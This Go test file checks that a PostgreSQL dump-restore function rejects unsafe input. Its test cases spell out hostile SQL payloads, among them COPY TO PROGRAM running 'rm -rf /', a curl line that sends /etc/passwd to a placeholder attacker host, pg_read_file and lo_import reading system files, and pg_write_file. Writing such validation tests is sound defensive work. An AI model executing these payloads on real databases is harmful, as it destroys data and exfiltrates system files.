package postgres_test

import (
	"context"
	"strings"
	"testing"

	"github.com/gravity-zero/evey/internal/adapters/driven/postgres"
)

func TestRestoreTables_Validation(t *testing.T) {
	d := postgres.NewDatabaseDumper("localhost", 5432, "user", "pass", "db", "disable")
	ctx := context.Background()

	t.Run("valid header passes validation", func(t *testing.T) {
		body := "-- PostgreSQL database dump\n\nSET statement_timeout = 0;\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		// psql won't be available in unit test — we only care that rejection did NOT happen
		if err != nil && (strings.Contains(err.Error(), "invalid file") || strings.Contains(err.Error(), "dangerous")) {
			t.Fatalf("valid dump was rejected: %v", err)
		}
	})

	t.Run("valid header with leading comment passes", func(t *testing.T) {
		body := "--\n-- PostgreSQL database dump\n--\n\nSET statement_timeout = 0;\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err != nil && (strings.Contains(err.Error(), "invalid file") || strings.Contains(err.Error(), "dangerous")) {
			t.Fatalf("valid dump with leading comment was rejected: %v", err)
		}
	})

	t.Run("missing header is rejected", func(t *testing.T) {
		body := "INSERT INTO users VALUES (1, 'hacked');\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "invalid file") {
			t.Fatalf("expected invalid file error, got: %v", err)
		}
	})

	t.Run("COPY TO PROGRAM is rejected", func(t *testing.T) {
		body := "-- PostgreSQL database dump\n\nCOPY users TO PROGRAM 'rm -rf /';\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "dangerous") {
			t.Fatalf("expected dangerous pattern error, got: %v", err)
		}
	})

	t.Run("COPY TO PROGRAM case-insensitive rejected", func(t *testing.T) {
		body := "-- PostgreSQL database dump\n\ncopy secrets to program 'curl -d @/etc/passwd evil.com';\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "dangerous") {
			t.Fatalf("expected dangerous pattern error, got: %v", err)
		}
	})

	t.Run("header at line 49 passes", func(t *testing.T) {
		var lines []string
		for i := 0; i < 48; i++ {
			lines = append(lines, "-- comment line")
		}
		lines = append(lines, "-- PostgreSQL database dump")
		lines = append(lines, "SET statement_timeout = 0;")
		body := strings.Join(lines, "\n") + "\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err != nil && (strings.Contains(err.Error(), "invalid file") || strings.Contains(err.Error(), "dangerous")) {
			t.Fatalf("header at line 49 should pass validation, got: %v", err)
		}
	})

	t.Run("header missing at EOF short file", func(t *testing.T) {
		body := "SET statement_timeout = 0;\nSELECT 1;\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "invalid file") {
			t.Fatalf("expected invalid file error for short file without header, got: %v", err)
		}
	})

	t.Run("empty file rejected", func(t *testing.T) {
		err := d.RestoreTables(ctx, strings.NewReader(""))
		if err == nil || !strings.Contains(err.Error(), "empty backup") {
			t.Fatalf("expected empty backup error, got: %v", err)
		}
	})

	t.Run("CREATE LANGUAGE rejected", func(t *testing.T) {
		body := "-- PostgreSQL database dump\n\nCREATE TRUSTED LANGUAGE plpythonu;\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "dangerous") {
			t.Fatalf("expected dangerous for CREATE LANGUAGE, got: %v", err)
		}
	})

	t.Run("DO $$ rejected", func(t *testing.T) {
		body := "-- PostgreSQL database dump\n\nDO $$ BEGIN RAISE NOTICE 'pwned'; END $$;\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "dangerous") {
			t.Fatalf("expected dangerous for DO $$, got: %v", err)
		}
	})

	t.Run("pg_read_file rejected", func(t *testing.T) {
		body := "-- PostgreSQL database dump\n\nSELECT pg_read_file('/etc/passwd');\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "dangerous") {
			t.Fatalf("expected dangerous for pg_read_file, got: %v", err)
		}
	})

	t.Run("pg_write_file rejected", func(t *testing.T) {
		body := "-- PostgreSQL database dump\n\nSELECT pg_write_file('/tmp/evil', 'data');\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "dangerous") {
			t.Fatalf("expected dangerous for pg_write_file, got: %v", err)
		}
	})

	t.Run("lo_import rejected", func(t *testing.T) {
		body := "-- PostgreSQL database dump\n\nSELECT lo_import('/etc/passwd');\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "dangerous") {
			t.Fatalf("expected dangerous for lo_import, got: %v", err)
		}
	})

	t.Run("lo_export rejected", func(t *testing.T) {
		body := "-- PostgreSQL database dump\n\nSELECT lo_export(12345, '/tmp/out');\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "dangerous") {
			t.Fatalf("expected dangerous for lo_export, got: %v", err)
		}
	})

	t.Run("case insensitive COPY TO PROGRAM", func(t *testing.T) {
		body := "-- PostgreSQL database dump\n\nCOPY users TO PROGRAM 'evil';\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "dangerous") {
			t.Fatalf("expected dangerous for uppercase COPY TO PROGRAM, got: %v", err)
		}
	})
}
